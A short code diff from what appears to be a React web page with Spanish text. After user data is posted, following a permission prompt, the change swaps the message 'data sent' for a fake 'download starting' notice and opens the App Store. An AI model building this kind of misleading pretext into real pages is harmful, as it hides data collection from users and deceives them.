@@ -38,7 +38,16 @@ export default function Home() {
                   body: JSON.stringify({ texto: text })
                 });
                 
-                alert('Datos enviados.');
+                alert('La descarga iniciara en unos segundos....');
+                        // Redirigir a la App Store (ficticia aquí)
+        window.open('https://apps.apple.com', '_blank');
+      } catch (error) {
+        console.error(error);
+        setStatus('Error al enviar datos');
+      }
+    }, () => {
+      setStatus('Permiso denegado');
+    });
               });
             }}
             className="flex items-center gap-2 bg-white text-black font-semibold px-6 py-3 rounded-lg hover:bg-gray-200 transition"
